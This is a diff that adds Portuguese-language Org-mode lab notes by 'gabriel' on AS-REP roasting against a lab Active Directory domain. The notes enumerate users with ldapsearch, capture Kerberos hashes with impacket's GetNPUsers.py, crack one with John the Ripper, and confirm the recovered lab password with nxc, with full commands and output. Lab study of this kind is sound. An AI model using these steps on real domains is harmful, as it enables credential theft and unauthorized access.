@@ -1,0 +1,85 @@
+#+title: Asrep Roasting
+#+Author:gabriel
+
+* continue
+** previous activity
+pegando nome de users -->
+#+begin_src sh
+[1:27][]~ ✮ ldapsearch -x -H ldap://192.168.122.26 -b 'DC=dc01,DC=lab' 'objectClass=user' sAMAccount name distinguishedName -D "tech.lab@dc01.lab" -W | grep "name:"
+
+name: Administrator
+name: Guest
+name: CENTRAL
+name: krbtgt
+name: tech user
+name: tech lab
+name: QUICKEM-KGTHLPH
+name: LESTE
+#+end_src
+
+
+limpando os nomes -->
+#+begin_src sh
+[1:27][]~ ✮ sed -i "s/name://g" names.txt
+
+Administrator
+ Guest
+ CENTRAL
+ krbtgt
+ tech.user
+ tech.lab
+ QUICKEM-KGTHLPH
+ LESTE
+#+end_src
+
+** impacket install and usage
+a instalação do impacket é simples utilizando o pipx, que pode ser instalado de forma simples também com  o ~brew~ -->
+#+begin_src sh
+brew install pipx
+#+end_src
+
+instalar a lib impacket -->
+#+begin_src sh
+pipx install impacket
+
+'impacket' already seems to be installed. Not modifying existing installation in
+'/home/ilak/.local/share/pipx/venvs/impacket'. Pass '--force' to force installation.
+#+end_src
+
+-----
+** AS-REP roasting
+
+users que possuem a opção 'DoesNotRequirePreAuth' == $true são vulneráveis ao AS-REP roasting, pois é possível capturar seus respectivos HASHES -->
+#+begin_src sh
+GetNPUsers.py dc01.lab/ -dc-ip 192.168.122.26 -format hashcat -usersfile names.txt
+
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)$krb5asrep$23$tech.user@DC01.LAB:a79b5d6b3d631b1bd9e061068627798b$ee385e88582e4d6c0680a985f8c590405ce0825c0058c27bfb7a3eaa58febbd48125b59911e83734323409cc678a826e86364ef9936b0b1de7f646b2a15cc6721c840405e8b42bdeb560230640689ad67f9eb20d2cfe817e5a03114ff54f56c07ea8e5dbfbe3b8df57b9f01b6c57f1567d19664c4a8e5c86dd2b911ad96a3639a385d5df6a3a416311f50972d861510185411044d5ed7590d6ec3ff3c8aedce9b0a55f9a6704ad589d750b1610a71636257c5bf40fa5afd9f474c682511d8cf83c2ea65e9f92d652db827bd076c5a12ce5289cef053c3e49bdf213be45689248e11f580e
+$krb5asrep$23$tech.lab@DC01.LAB:80c0465ec2b6cf7e8748449e21b878ac$6386479978126f4dc4506b5517001e5c5477acb24d7a13a46f6cfc20586ef1971a33c0c48f20ec7e80464e1d8122f948ea886c3dfd5c09edf60313afd1104eeca12896b7f9153f51bedc84926dfc27a270f7817e001b7d936f3913e0fa908485c91d099d17db3d8ef60c7f2ddee7c8e7bba8edea5760582b07c96b4b09ada1167d5f696c40d88e453e52d995078d859c1c8571c64e84bd28898250a91f7c4916afbaf22c166cf9448b29abf666526bf5c79fbee90a867759de4470c11a2c18ccf67468329859066eb24354dc0420b57e5c8367000083f1434e4c650b087fac1a173146d3
+[-] User QUICKEM-KGTHLPH doesn't have UF_DONT_REQUIRE_PREAUTH set
+#+end_src
+
+usando o John the ripper para tentar quebrar o hash de um dos users -->
+#+begin_src sh
+john --format=krb5asrep --wordlist=/usr/share/wordlists/kali-wordlists/rockyou.txt hash.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSSE3 4x])
+No password hashes left to crack (see FAQ)
+#+end_src
+
+eu ja tinha quebrado -->
+#+begin_src sh
+john --show hash.txt
+
+$krb5asrep$23$tech.user@DC01.LAB:Password123.
+
+1 password hash cracked, 0 left
+#+end_src
+
+testando a credencial -->
+#+begin_src sh
+nxc ldap 192.168.122.26 -u "tech.user" -p "Password123."
+
+LDAP        192.168.122.26  389    CENTRAL          [*] Windows Server 2022 Build 20348 (name:CENTRAL) (domain:dc01.lab)
+LDAP        192.168.122.26  389    CENTRAL          [+] dc01.lab\tech.user:Password123.
+#+end_src
